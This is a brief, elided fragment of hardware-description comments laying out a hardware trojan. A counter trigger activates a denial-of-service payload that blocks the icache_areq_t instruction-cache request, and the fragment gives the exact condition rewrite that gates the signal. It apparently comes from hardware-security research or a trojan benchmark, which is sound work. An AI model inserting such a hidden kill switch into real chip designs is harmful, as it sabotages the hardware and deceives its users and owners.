 ...
 * 
 * Description:
 *   Disables operations by blocking icache_areq_t control signal
 *   
 * Trigger: Counter on icache_areq_t
 * Payload: Block icache_areq_t when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block icache_areq_t when trojan is active
//
// IMPORTANT: icache_areq_t is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (icache_areq_t && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: icache_areq_t && 0 = 0 (always false)
//   All operations controlled by icache_areq_t are blocked
